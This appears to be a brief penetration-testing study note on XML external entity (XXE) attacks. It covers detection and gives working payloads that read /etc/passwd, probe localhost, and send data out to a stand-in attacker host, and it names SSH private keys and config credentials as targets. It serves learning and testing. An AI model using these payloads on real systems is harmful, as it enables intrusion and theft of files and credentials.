## What is it

XXE is an attack where you abuse an XML parser that has external entity processing enabled. By injecting a malicious entity definition into an XML payload, you can make the server read local files, perform internal network requests, or even execute code in some cases.

---
## How to detect it

- Any endpoint that accepts XML input
- SOAP APIs, file uploads (.xml, .docx, .svg, .xlsx — all XML-based), RSS feeds
- Try injecting a basic entity and see if it gets processed:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "test">]>
<root>&xxe;</root>
```
If `test` appears in the response, the parser is processing entities.

---
## How to exploit it

**Local file read:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**Internal network probing (like SSRF):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
<root>&xxe;</root>
```

**Blind XXE — exfiltrate via out-of-band:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.htb/?data=/etc/passwd">]>
<root>&xxe;</root>
```

---
## Common targets

- File uploads (SVG, DOCX, XLSX, PDF parsers)
- SOAP web services
- APIs that accept `Content-Type: application/xml`
- Any form that processes XML server-side

---
## Things to try

- `/etc/passwd` — confirm LFI works
- `/etc/hosts` — internal network layout
- `~/.ssh/id_rsa` — private keys
- App config files — often contain credentials

---
## Tools
- Burp Suite — intercept requests, change Content-Type to XML, inject payloads
